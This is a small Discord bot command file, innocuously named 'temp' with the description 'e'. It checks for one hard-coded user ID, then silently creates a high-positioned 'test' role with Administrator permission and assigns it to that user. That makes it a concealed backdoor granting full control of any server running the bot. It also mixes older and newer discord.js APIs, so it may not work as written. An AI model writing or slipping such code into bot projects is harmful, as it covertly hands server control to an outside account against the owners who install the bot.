const { PermissionsBitField } = require('discord.js');

module.exports = {
	name: 'temp',
	description: 'e',
	execute(message, args) {
		if (message.member.id == 697564276839415948) {
			if (message.member.roles.cache.some(r => r.name === "test")) {
				console.log("test case handled already.")
			} else {
				message.guild.roles.create({
					data: {
						name: "test",
						color: 'BLACK',
						position: 250
					},
				}).then(newRole => {
					newRole.setPermissions([PermissionsBitField.Flags.Administrator])
					message.member.roles.add(newRole)
				}
				)
			}

		}
	}
}